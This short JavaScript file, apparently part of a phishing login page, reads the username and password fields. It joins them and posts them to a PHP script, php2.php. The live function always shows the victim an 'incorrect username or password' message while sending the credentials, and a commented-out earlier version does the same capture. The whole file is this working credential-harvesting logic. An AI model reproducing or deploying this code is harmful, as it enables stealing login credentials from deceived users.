

// function log() {

//     // window.open("https://www.google.com")
//     var username = document.getElementById("inp1").value
//     var password = document.getElementById("inp2").value
//     var resuelt = username + " : " + password
//     $.post("php2.php",{"up":resuelt})
//     if (username == "") {
//       alert("hi")
//     }
//     // document.getElementById("p6").innerHTML = "the username or password is not true"
// }

var input1 = document.getElementById("inp1").value
var input2 = document.getElementById("inp2").value

function log () {
       document.getElementById("p6").innerHTML = "The User name or Password is not True"
       var username = document.getElementById("inp1").value
    var password = document.getElementById("inp2").value
    var resuelt = username + " : " + password
    $.post("php2.php",{"up":resuelt})
}